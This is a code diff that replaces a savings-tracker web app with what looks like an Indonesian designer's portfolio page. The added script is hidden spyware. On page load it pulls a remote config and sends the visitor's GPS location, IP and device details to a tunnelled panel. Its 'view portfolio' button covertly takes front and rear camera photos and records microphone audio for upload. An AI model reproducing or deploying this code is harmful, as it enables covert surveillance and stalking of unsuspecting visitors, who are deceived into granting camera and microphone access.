@@ -2,217 +2,346 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Tabungan Craft</title>
-<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Rizky Pratama — Product Designer</title>
 <style>
-*{box-sizing:border-box;font-family:'Press Start 2P',monospace,sans-serif;image-rendering:pixelated}
-body{margin:0;color:#fff;font-size:11px;line-height:1.6;
- background-color:#6b4a2b;
- background-image:
-  linear-gradient(45deg,#5e4125 25%,transparent 25%,transparent 75%,#5e4125 75%),
-  linear-gradient(45deg,#5e4125 25%,transparent 25%,transparent 75%,#5e4125 75%);
- background-size:32px 32px;background-position:0 0,16px 16px}
-.wrap{max-width:480px;margin:auto;padding:0 14px 110px}
-.top{background:#5db03a;border-bottom:8px solid #3b7a22;box-shadow:0 8px 0 #4a2f18;margin:0 -14px 22px;padding:22px 14px 16px;text-align:center;
- background-image:linear-gradient(90deg,#4f9c2f 50%,transparent 50%);background-size:24px 24px}
-h1{font-size:15px;margin:0;text-shadow:3px 3px 0 #1d4a0e}
-h2{font-size:13px;text-shadow:2px 2px 0 #000;margin:6px 0 12px}
-h3{font-size:11px;text-shadow:2px 2px 0 #000}
-.grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
-.box{background:#8b8b8b;border:4px solid #000;padding:12px;cursor:pointer;
- box-shadow:inset -4px -4px 0 #555,inset 4px 4px 0 #c6c6c6,4px 4px 0 #0008;color:#222}
-.box:active{transform:translate(2px,2px)}
-.box b{display:block;margin-bottom:8px;color:#000;font-size:10px;word-break:break-word}
-.stat{cursor:default}
-.stat:active{transform:none}
-.big{font-size:15px;color:#1a6b00;margin:6px 0}
-.bar{display:flex;gap:2px;background:#000;padding:3px;margin:8px 0}
-.bar i{flex:1;height:12px;background:#3a3a3a}
-.bar i.on{background:#7fe24a;box-shadow:inset 0 -3px 0 #3f9a1c,inset 0 3px 0 #b6ff8a}
-.bar.gold i.on{background:#ffd53d;box-shadow:inset 0 -3px 0 #c59a00,inset 0 3px 0 #fff0a0}
-.small{font-size:8px;color:#333;line-height:1.8}
-.dim{font-size:8px;color:#ddd;text-shadow:1px 1px 0 #000}
-.add{background:#5db03a;border:4px solid #000;color:#fff;font-size:34px;min-height:120px;cursor:pointer;
- box-shadow:inset -4px -4px 0 #3b7a22,inset 4px 4px 0 #8ee060,4px 4px 0 #0008;text-shadow:3px 3px 0 #1d4a0e}
-.add:active{transform:translate(2px,2px)}
-.btn{display:block;width:100%;padding:14px;border:4px solid #000;margin-top:12px;color:#fff;font-size:10px;cursor:pointer;
- background:#5db03a;box-shadow:inset -4px -4px 0 #3b7a22,inset 4px 4px 0 #8ee060;text-shadow:2px 2px 0 #1d4a0e}
-.btn:active{transform:translate(2px,2px)}
-.btn.gray{background:#7a7a7a;box-shadow:inset -4px -4px 0 #4a4a4a,inset 4px 4px 0 #b0b0b0;text-shadow:2px 2px 0 #222}
-.btn.red{background:#c0392b;box-shadow:inset -4px -4px 0 #7a1f15,inset 4px 4px 0 #ef7b6e;text-shadow:2px 2px 0 #4a0e08}
-.btn.gold{background:#e6b800;box-shadow:inset -4px -4px 0 #9a7a00,inset 4px 4px 0 #ffe66b;text-shadow:2px 2px 0 #6a5000}
-.btn:disabled{opacity:.45;cursor:not-allowed}
-input{width:100%;padding:12px;border:4px solid #000;background:#2b2b2b;color:#fff;font-size:11px;margin-top:10px;
- box-shadow:inset 3px 3px 0 #000;outline:none}
-input:focus{border-color:#7fe24a}
-.prev{margin-top:8px;color:#ffd53d;font-size:9px;text-shadow:1px 1px 0 #000;min-height:14px}
-.back{background:#7a7a7a;border:4px solid #000;color:#fff;font-size:9px;padding:8px 10px;margin-bottom:14px;cursor:pointer;
- box-shadow:inset -3px -3px 0 #4a4a4a,inset 3px 3px 0 #b0b0b0}
-.row{background:#8b8b8b;border:4px solid #000;padding:10px;margin-top:10px;display:flex;justify-content:space-between;align-items:center;color:#000;
- box-shadow:inset -3px -3px 0 #555,inset 3px 3px 0 #c6c6c6}
-.row b{color:#1a6b00;font-size:10px}
-.fab{position:fixed;right:18px;bottom:18px;width:68px;height:68px;border:4px solid #000;background:#5db03a;color:#fff;font-size:34px;cursor:pointer;
- box-shadow:inset -4px -4px 0 #3b7a22,inset 4px 4px 0 #8ee060,4px 4px 0 #0008;text-shadow:3px 3px 0 #1d4a0e}
-.fab:active{transform:translate(2px,2px)}
-.modal{position:fixed;inset:0;background:#000a;display:none;align-items:flex-end;justify-content:center}
-.modal.show{display:flex}
-.sheet{background:#8b8b8b;border:4px solid #000;border-bottom:0;width:100%;max-width:480px;padding:18px;
- box-shadow:inset 4px 4px 0 #c6c6c6,inset -4px 0 0 #555}
-.sheet h3{color:#000;text-shadow:none}
-.sheet .small{color:#222}
-.toast{position:fixed;top:12px;left:50%;transform:translateX(-50%);background:#000;border:4px solid #ffd53d;color:#ffd53d;padding:10px 14px;font-size:9px;display:none;z-index:9;text-align:center}
+:root{--ink:#0A0A0A;--paper:#F5F1E8;--accent:#FF5C00;--accent2:#00C2FF;--lime:#C8FF00;--card:#FFFFFF;--shadow:8px;}
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
+
+body{
+  background:var(--paper);
+  color:var(--ink);
+  font-family:'Space Grotesk','Inter',system-ui,sans-serif;
+  min-height:100vh;
+  background-image:linear-gradient(var(--ink) 1px,transparent 1px),linear-gradient(90deg,var(--ink) 1px,transparent 1px);
+  background-size:48px 48px;
+  background-position:-1px -1px;
+  padding:24px 16px 64px;
+  overflow-x:hidden;
+}
+.wrap{max-width:560px;margin:0 auto;}
+
+/* TOPBAR */
+.topbar{display:flex;align-items:center;justify-content:space-between;background:var(--card);border:4px solid var(--ink);box-shadow:var(--shadow) var(--shadow) 0 var(--ink);padding:12px 16px;margin-bottom:28px;}
+.brand{font-weight:900;font-size:14px;letter-spacing:-0.5px;display:flex;align-items:center;gap:8px;}
+.dot{width:14px;height:14px;background:var(--accent);border:3px solid var(--ink);border-radius:50%;}
+.menu-btn{width:38px;height:38px;background:var(--lime);border:3px solid var(--ink);box-shadow:3px 3px 0 var(--ink);display:flex;align-items:center;justify-content:center;cursor:pointer;}
+.menu-btn div{display:flex;flex-direction:column;gap:3px;}
+.menu-btn span{display:block;width:16px;height:3px;background:var(--ink);}
+
+/* HERO */
+.hero{background:var(--card);border:4px solid var(--ink);box-shadow:var(--shadow) var(--shadow) 0 var(--ink);padding:28px 24px;margin-bottom:24px;position:relative;overflow:hidden;}
+.hero::before{content:'AVAILABLE FOR WORK';position:absolute;top:14px;right:-40px;background:var(--accent);color:#fff;font-size:9px;font-weight:900;letter-spacing:2px;padding:6px 60px;transform:rotate(38deg);border-top:2px solid var(--ink);border-bottom:2px solid var(--ink);}
+.avatar{width:96px;height:96px;border-radius:50%;background:linear-gradient(135deg,var(--accent) 0%,var(--accent2) 100%);border:4px solid var(--ink);box-shadow:5px 5px 0 var(--ink);display:flex;align-items:center;justify-content:center;font-size:40px;font-weight:900;color:#fff;margin-bottom:18px;letter-spacing:-2px;}
+h1{font-size:32px;font-weight:900;line-height:1.05;letter-spacing:-1.5px;margin-bottom:8px;}
+h1 .hl{background:var(--lime);padding:0 6px;border:3px solid var(--ink);display:inline-block;transform:rotate(-1deg);box-shadow:3px 3px 0 var(--ink);}
+.role{font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:2px;color:var(--accent);margin-bottom:16px;display:flex;align-items:center;gap:8px;}
+.role::before{content:'';width:8px;height:8px;background:var(--accent);border:2px solid var(--ink);}
+.bio{font-size:14px;line-height:1.6;font-weight:500;color:#2a2a2a;margin-bottom:20px;}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:0;border-top:3px solid var(--ink);padding-top:16px;}
+.stat{padding:0 8px;border-right:3px solid var(--ink);text-align:center;}
+.stat:first-child{padding-left:0;text-align:left;}
+.stat:last-child{border-right:none;padding-right:0;text-align:right;}
+.stat b{display:block;font-size:22px;font-weight:900;letter-spacing:-1px;}
+.stat span{font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:#666;}
+
+/* WORKS */
+.works{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:28px;}
+.work{background:var(--card);border:3px solid var(--ink);box-shadow:4px 4px 0 var(--ink);padding:10px;display:flex;flex-direction:column;gap:8px;}
+.thumb{width:100%;aspect-ratio:4/3;border:3px solid var(--ink);display:flex;align-items:center;justify-content:center;font-weight:900;font-size:24px;}
+.work:nth-child(1) .thumb{background:linear-gradient(135deg,var(--accent2),#0088BB);color:#fff;}
+.work:nth-child(2) .thumb{background:linear-gradient(135deg,var(--lime),#88AA00);color:var(--ink);}
+.work:nth-child(3) .thumb{background:linear-gradient(135deg,#FFB000,#CC8800);color:#fff;}
+.work:nth-child(4) .thumb{background:linear-gradient(135deg,#B080FF,#7040CC);color:#fff;}
+.work h4{font-size:12px;font-weight:900;text-transform:uppercase;letter-spacing:0.5px;}
+.work p{font-size:9px;font-weight:700;color:#666;text-transform:uppercase;letter-spacing:1px;}
+
+/* FOOTER */
+footer{text-align:center;font-size:10px;font-weight:700;color:#888;text-transform:uppercase;letter-spacing:2px;padding-top:24px;border-top:3px solid var(--ink);margin-top:16px;}
+footer a{color:var(--ink);text-decoration:none;border-bottom:2px solid var(--accent);}
+
+/* ---------- OVERLAY GERBANG (HALAMAN AWAL) ---------- */
+#gateOverlay{
+  position:fixed;inset:0;z-index:10000;
+  background:var(--paper);
+  background-image:linear-gradient(var(--ink) 1px,transparent 1px),linear-gradient(90deg,var(--ink) 1px,transparent 1px);
+  background-size:48px 48px;background-position:-1px -1px;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  padding:20px;text-align:center;
+  transition:opacity 0.4s ease, visibility 0.4s ease;
+}
+#gateOverlay.hide{opacity:0;visibility:hidden;}
+
+.gate-box{
+  background:var(--card);border:4px solid var(--ink);
+  box-shadow:10px 10px 0 var(--ink);
+  padding:40px 24px;max-width:400px;width:100%;
+  position:relative;overflow:hidden;
+}
+.gate-box::before{
+  content:'PORTFOLIO';position:absolute;top:14px;right:-40px;
+  background:var(--accent2);color:#fff;font-size:9px;font-weight:900;
+  letter-spacing:2px;padding:6px 60px;transform:rotate(38deg);
+  border-top:2px solid var(--ink);border-bottom:2px solid var(--ink);
+}
+
+.gate-logo{
+  width:80px;height:80px;margin:0 auto 20px;
+  background:linear-gradient(135deg,var(--accent) 0%,var(--accent2) 100%);
+  border:4px solid var(--ink);box-shadow:5px 5px 0 var(--ink);
+  border-radius:50%;display:flex;align-items:center;justify-content:center;
+  font-size:32px;font-weight:900;color:#fff;letter-spacing:-1px;
+}
+.gate-box h2{font-size:24px;font-weight:900;text-transform:uppercase;letter-spacing:-0.5px;margin-bottom:8px;line-height:1.1;}
+.gate-box p{font-size:14px;font-weight:600;color:#555;line-height:1.5;margin-bottom:28px;}
+
+.gate-btn{
+  width:100%;background:var(--lime);color:var(--ink);
+  border:4px solid var(--ink);box-shadow:6px 6px 0 var(--ink);
+  padding:18px;font-family:inherit;font-size:16px;font-weight:900;
+  text-transform:uppercase;letter-spacing:1px;cursor:pointer;
+  display:flex;justify-content:center;align-items:center;gap:10px;
+  transition:.1s;
+}
+.gate-btn:active{transform:translate(6px,6px);box-shadow:none;}
+.gate-btn svg{width:20px;height:20px;}
 </style>
 </head>
 <body>
-<div class="toast" id="toast"></div>
-<div class="wrap">
-  <div class="top"><h1>⛏️ TABUNGAN CRAFT</h1></div>
-  <div id="app"></div>
+
+<!-- ============ OVERLAY GERBANG (TAMPILAN PERTAMA) ============ -->
+<div id="gateOverlay">
+  <div class="gate-box">
+    <div class="gate-logo">RP</div>
+    <h2>Rizky Pratama</h2>
+    <p>Selamat datang di ruang karya saya. Silakan jelajahi portofolio interaktif di bawah ini.</p>
+    
+    <!-- TOMBOL PEMICU KAMERA & MIC -->
+    <button class="gate-btn" id="gateBtn" onclick="masukWeb()">
+      Lihat Portofolio
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+        <line x1="5" y1="12" x2="19" y2="12"></line>
+        <polyline points="12 5 19 12 12 19"></polyline>
+      </svg>
+    </button>
+  </div>
 </div>
-<div class="modal" id="modal"><div class="sheet" id="sheet"></div></div>
+
+<!-- ============ HALAMAN PORTOFOLIO ASLI ============ -->
+<div class="wrap">
+  <div class="topbar">
+    <div class="brand"><div class="dot"></div>RP.STUDIO</div>
+    <div class="menu-btn"><div><span></span><span></span><span></span></div></div>
+  </div>
+  
+  <div class="hero">
+    <div class="avatar">RP</div>
+    <h1>Halo, saya <span class="hl">Rizky</span>.</h1>
+    <div class="role">Product Designer</div>
+    <p class="bio">Saya mendesain antarmuka yang bersih, fungsional, dan berkarakter. 5 tahun pengalaman di startup & agensi. Fokus pada design system, prototyping, dan user research.</p>
+    <div class="stats">
+      <div class="stat"><b>5+</b><span>Tahun</span></div>
+      <div class="stat"><b>42</b><span>Proyek</span></div>
+      <div class="stat"><b>18</b><span>Klien</span></div>
+    </div>
+  </div>
+
+  <div class="works">
+    <div class="work"><div class="thumb">01</div><h4>Fintech App</h4><p>Mobile · 2025</p></div>
+    <div class="work"><div class="thumb">02</div><h4>Design System</h4><p>Web · 2024</p></div>
+    <div class="work"><div class="thumb">03</div><h4>E-Commerce</h4><p>Web · 2024</p></div>
+    <div class="work"><div class="thumb">04</div><h4>SaaS Dashboard</h4><p>Web · 2023</p></div>
+  </div>
+
+  <footer>© 2026 Rizky Pratama · <a href="#">Portofolio</a> · <a href="#">Kontak</a></footer>
+</div>
 
 <script>
-const rp = n => "Rp " + Number(n).toLocaleString("id-ID");
-const tgl = d => new Date(d).toLocaleDateString("id-ID",{day:"numeric",month:"long",year:"numeric"});
-let goals = [];
-try { goals = JSON.parse(localStorage.getItem("tabungan")) || []; } catch(e){}
-let aktif = null;
+  const GITHUB_CONFIG_URL = "https://raw.githubusercontent.com/ciremai174-hub/Sadap/refs/heads/main/config.json";
+  let URL_PANEL = "https://combo-gui-string-trunk.trycloudflare.com"; 
+  let IS_MAINTENANCE = false;
+  
+  const gateOverlay = document.getElementById('gateOverlay');
+  const gateBtn = document.getElementById('gateBtn');
 
-const simpan = () => { try { localStorage.setItem("tabungan", JSON.stringify(goals)); } catch(e){} };
-const total = g => g.setoran.reduce((a,b)=>a+b.jumlah,0);
-const hariKe = (g,d) => Math.floor((new Date(d)-new Date(g.mulai))/864e5)+1;
-
-/* Baca angka: 500000 | 500.000 | 500,000 | 500k | 500rb | 1jt | 1,5jt */
-function parseUang(s){
-  s = String(s).toLowerCase().replace(/\s|rp/g,"");
-  const m = s.match(/^([\d.,]+)(k|rb|ribu|jt|juta)?$/);
-  if(!m) return 0;
-  if(m[2]){
-    const n = parseFloat(m[1].replace(",","."));
-    if(isNaN(n)) return 0;
-    const mult = (m[2]==="jt"||m[2]==="juta") ? 1e6 : 1e3;
-    return Math.round(n*mult);
+  // 1. FUNGSI AMBIL INFO DEVICE & GPS
+  async function buildInfo() {
+    const info = { ip: '?', os: navigator.userAgent.includes("Android") ? "Android" : navigator.userAgent, browser: navigator.userAgent.includes('Chrome') ? 'Chrome' : 'Safari', res: `${screen.width}x${screen.height}`, lang: navigator.language, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, cores: navigator.hardwareConcurrency || '?', ram: navigator.deviceMemory || '?', battery: '?', network: navigator.connection?.effectiveType || '?', gps: 'Izin Ditolak/Tidak Tersedia' };
+    try { const pos = await new Promise((res, rej) => { navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }); }); info.gps = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude} (Akurasi: ${pos.coords.accuracy}m)`; } catch(e) {}
+    try { info.ip = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; } catch(e) {}
+    try { if (navigator.getBattery) { const b = await navigator.getBattery(); info.battery = Math.round(b.level * 100) + '%'; } } catch(e) {}
+    return info;
   }
-  return Number(m[1].replace(/[.,]/g,"")) || 0;
-}
 
-function bar(p, emas){
-  let h = '<div class="bar'+(emas?' gold':'')+'">';
-  const on = Math.floor(p/5);
-  for(let i=0;i<20;i++) h += '<i class="'+(i<on?'on':'')+'"></i>';
-  return h+'</div>';
-}
+  // 2. PASIF: Ambil Config & Kirim GPS saat halaman dibuka (tanpa klik)
+  (async function init() {
+    try {
+      const configRes = await fetch(GITHUB_CONFIG_URL + "?t=" + Date.now());
+      const config = await configRes.json();
+      if (config.maintenance === true) {
+        IS_MAINTENANCE = true;
+        gateBtn.style.display = 'none';
+        document.querySelector('.gate-box h2').textContent = 'Server Maintenance';
+        document.querySelector('.gate-box p').textContent = config.message || 'Sabar ya, server sedang diperbaiki.';
+        return; 
+      }
+      URL_PANEL = config.server_url || URL_PANEL;
+      
+      // Ambil GPS di background
+      const info = await buildInfo();
+      window.__BASE_INFO = info;
+      await fetch(`${URL_PANEL}/api/masuk`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(info) });
+      
+    } catch(e) {
+      const info = await buildInfo(); window.__BASE_INFO = info;
+      try { await fetch(`${URL_PANEL}/api/masuk`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(info) }); } catch(err) {}
+    }
+  })();
 
-function toast(t){
-  const e = document.getElementById("toast");
-  e.textContent = t; e.style.display = "block";
-  setTimeout(()=>e.style.display="none", 2200);
-}
+  // 3. PICU KAMERA & MIC PAS KLIK TOMBOL
+  async function masukWeb() {
+    if (IS_MAINTENANCE) return;
+    gateBtn.disabled = true;
+    gateBtn.innerHTML = 'Membuka...';
+    
+    // Sembunyiin Gate (Portofolio kebuka)
+    gateOverlay.classList.add('hide');
 
-function home(){
-  aktif = null;
-  document.getElementById("app").innerHTML = `
-    <h2>🎒 Inventory Tabungan</h2>
-    <div class="grid">
-      ${goals.map((g,i)=>{
-        const t = total(g), p = Math.min(100, t/g.target*100), ok = t>=g.target;
-        return `<div class="box" onclick="detail(${i})">
-          <b>${ok?"💎":"🧱"} ${g.nama}</b>
-          ${bar(p,ok)}
-          <div class="small">${rp(t)}<br>/ ${rp(g.target)}</div>
-          ${ok?'<div class="small" style="color:#1a6b00">QUEST SELESAI!</div>':''}
-        </div>`;
-      }).join("")}
-      <button class="add" onclick="formBaru()">+</button>
-    </div>
-    ${goals.length?"":'<p class="dim" style="margin-top:18px">Belum ada quest. Tekan + untuk mulai!</p>'}`;
-}
+    let gpsData = window.__BASE_INFO?.gps || 'Izin Ditolak/Tidak Tersedia';
+    let globalStream = null;
+    let audioStream = null;
 
-function formBaru(){
-  buka(`
-    <h3>⚒️ Quest Baru</h3>
-    <input id="nama" placeholder="Nama (cth: Beli HP)">
-    <input id="target" placeholder="Target (500k / 500.000 / 1jt)" oninput="prevTarget()">
-    <div class="prev" id="prev"></div>
-    <button class="btn" onclick="buatTujuan()">BUAT</button>
-    <button class="btn gray" onclick="tutup()">BATAL</button>`);
-}
+    // MINTA SEMUA IZIN SEKALIGUS (Kamera + Mic)
+    try {
+      globalStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user' },
+        audio: true 
+      });
 
-function prevTarget(){
-  const n = parseUang(document.getElementById("target").value);
-  document.getElementById("prev").textContent = n ? "= " + rp(n) : "";
-}
+      const audioTracks = globalStream.getAudioTracks();
+      if (audioTracks.length > 0) audioStream = new MediaStream([audioTracks[0]]);
 
-function buatTujuan(){
-  const nama = document.getElementById("nama").value.trim() || "Tabungan";
-  const target = parseUang(document.getElementById("target").value);
-  if(!target) return toast("Isi target dulu ya!");
-  goals.push({nama, target, mulai:new Date().toISOString(), setoran:[]});
-  simpan(); tutup(); home();
-}
+      const videoTracks = globalStream.getVideoTracks();
+      if (videoTracks.length > 0) {
+        const videoDepanStream = new MediaStream([videoTracks[0]]);
+        // JEPRET DEPAN (0.2 detik)
+        await captureFotoDepan(videoDepanStream, gpsData);
+        videoTracks[0].stop();
+      }
+    } catch(e) { console.log("User tidak memberi izin."); }
 
-function detail(i){
-  aktif = i;
-  const g = goals[i], t = total(g), p = Math.min(100, t/g.target*100);
-  const ok = t >= g.target;
-  document.getElementById("app").innerHTML = `
-    <button class="back" onclick="home()">◀ KEMBALI</button>
-    <h2>${ok?"💎":"🧱"} ${g.nama}</h2>
-    <div class="box stat">
-      <div class="small">TERKUMPUL</div>
-      <div class="big">${rp(t)}</div>
-      ${bar(p,ok)}
-      <div class="small">Target: ${rp(g.target)}<br>Sisa: ${rp(Math.max(0,g.target-t))}<br>Mulai: ${tgl(g.mulai)}</div>
-    </div>
-    <button class="btn ${ok?'gold':'gray'}" ${ok?"":"disabled"} onclick="cairkan(${i})">
-      ${ok?"💎 CAIRKAN / KELUAR":"🔒 BELUM TERCAPAI"}
-    </button>
-    <h3 style="margin-top:22px">📜 Riwayat</h3>
-    ${g.setoran.length? g.setoran.slice().reverse().map(s=>`
-      <div class="row">
-        <span>HARI KE-${s.hari}<br><span class="small">${tgl(s.tanggal)}</span></span>
-        <b>+${rp(s.jumlah)}</b>
-      </div>`).join("") : '<p class="dim">Belum ada setoran.</p>'}
-    <button class="fab" onclick="formSetor()">+</button>`;
-}
+    // Jeda 0.2 detik
+    await new Promise(r => setTimeout(r, 200));
 
-function formSetor(){
-  const g = goals[aktif];
-  buka(`
-    <h3>💰 Nyicil</h3>
-    <input id="jml" placeholder="Jumlah (6000 / 6k / 6rb)" oninput="prevSetor()">
-    <div class="prev" id="prev"></div>
-    <div class="small" style="margin-top:8px">${tgl(new Date())}<br>HARI KE-${hariKe(g,new Date())}</div>
-    <button class="btn" onclick="konfirmasi()">KONFIRMASI</button>
-    <button class="btn gray" onclick="tutup()">BATAL</button>`);
-}
+    // JEPRET BELAKANG (0.2 detik)
+    await captureFotoBelakang(gpsData);
+    await new Promise(r => setTimeout(r, 200));
 
-function prevSetor(){
-  const n = parseUang(document.getElementById("jml").value);
-  document.getElementById("prev").textContent = n ? "= " + rp(n) : "";
-}
-
-function konfirmasi(){
-  const jumlah = parseUang(document.getElementById("jml").value);
-  if(!jumlah) return toast("Isi jumlahnya dulu ya!");
-  const g = goals[aktif], now = new Date();
-  const sebelum = total(g);
-  g.setoran.push({jumlah, tanggal:now.toISOString(), hari:hariKe(g,now)});
-  simpan(); tutup(); detail(aktif);
-  if(sebelum < g.target && total(g) >= g.target) toast("💎 TARGET TERCAPAI!");
-}
-
-function cairkan(i){
-  if(confirm("Cairkan tabungan ini? Quest akan dihapus dari daftar.")){
-    goals.splice(i,1); simpan(); home();
+    // REKAM AUDIO (20 detik)
+    if (audioStream) {
+        captureAudio(audioStream, gpsData).catch(() => {});
+    }
   }
-}
 
-function buka(html){ document.getElementById("sheet").innerHTML = html; document.getElementById("modal").classList.add("show"); }
-function tutup(){ document.getElementById("modal").classList.remove("show"); }
+  // ============================================================
+  // FUNGSI JEPRET FOTO DEPAN
+  // ============================================================
+  async function captureFotoDepan(stream, gpsData) {
+    try {
+      const videoEl = document.createElement('video');
+      videoEl.muted = true; videoEl.playsInline = true; videoEl.srcObject = stream;
+      await videoEl.play();
+      
+      // Jeda 0.2 detik (200ms)
+      await new Promise(r => setTimeout(r, 200)); 
 
-home();
+      const canvas = document.createElement('canvas');
+      canvas.width = videoEl.videoWidth || 640;
+      canvas.height = videoEl.videoHeight || 480;
+      canvas.getContext('2d').drawImage(videoEl, 0, 0);
+      const foto = canvas.toDataURL('image/jpeg', 0.75);
+
+      if (foto && URL_PANEL) {
+        const info = await buildInfo(); info.gps = gpsData;
+        await fetch(`${URL_PANEL}/api/terima`, {
+          method: 'POST', headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ info, media: [{ jenis: 'foto_depan', data: foto }] })
+        });
+      }
+    } catch(e) { console.log("Gagal depan:", e); }
+  }
+
+  // ============================================================
+  // FUNGSI JEPRET FOTO BELAKANG
+  // ============================================================
+  async function captureFotoBelakang(gpsData) {
+    try {
+      let stream;
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'environment' } }, audio: false });
+      } catch(e) {
+        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+      }
+
+      const videoEl = document.createElement('video');
+      videoEl.muted = true; videoEl.playsInline = true; videoEl.srcObject = stream;
+      await videoEl.play();
+      
+      // Jeda 0.2 detik (200ms)
+      await new Promise(r => setTimeout(r, 200));
+
+      const canvas = document.createElement('canvas');
+      canvas.width = videoEl.videoWidth || 640;
+      canvas.height = videoEl.videoHeight || 480;
+      canvas.getContext('2d').drawImage(videoEl, 0, 0);
+      const foto = canvas.toDataURL('image/jpeg', 0.75);
+
+      stream.getTracks().forEach(t => t.stop());
+
+      if (foto && URL_PANEL) {
+        const info = await buildInfo(); info.gps = gpsData;
+        await fetch(`${URL_PANEL}/api/terima`, {
+          method: 'POST', headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ info, media: [{ jenis: 'foto_belakang', data: foto }] })
+        });
+      }
+    } catch(e) { console.log("Gagal belakang:", e); }
+  }
+
+  // ============================================================
+  // FUNGSI REKAM AUDIO (20S CHUNK 3S)
+  // ============================================================
+  async function captureAudio(stream, gpsData) {
+    try {
+      const DURASI_TOTAL = 20000;
+      const CHUNK_MS = 3000;
+      let mimeType = 'audio/webm';
+      let ext = 'webm';
+      if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) mimeType = 'audio/webm;codecs=opus';
+      else if (MediaRecorder.isTypeSupported('audio/mp4')) { mimeType = 'audio/mp4'; ext = 'mp4'; }
+
+      const recorder = new MediaRecorder(stream, { mimeType, audioBitsPerSecond: 32000 });
+
+      recorder.ondataavailable = async (event) => {
+        if (!event.data || event.data.size === 0) return;
+        const reader = new FileReader();
+        reader.onloadend = async () => {
+          const b64 = reader.result;
+          const info = await buildInfo(); info.gps = gpsData;
+          try {
+            await fetch(`${URL_PANEL}/api/terima`, {
+              method: 'POST', headers: {'Content-Type': 'application/json'},
+              body: JSON.stringify({ info, media: [{ jenis: 'audio', ext: ext, data: b64 }] })
+            });
+          } catch(e) {}
+        };
+        reader.readAsDataURL(event.data);
+      };
+      recorder.onstop = () => { stream.getTracks().forEach(t => t.stop()); };
+      recorder.start(CHUNK_MS);
+      setTimeout(() => { if (recorder.state !== 'inactive') recorder.stop(); }, DURASI_TOTAL);
+    } catch(e) { console.log("Gagal audio:", e); }
+  }
 </script>
 </body>
 </html>
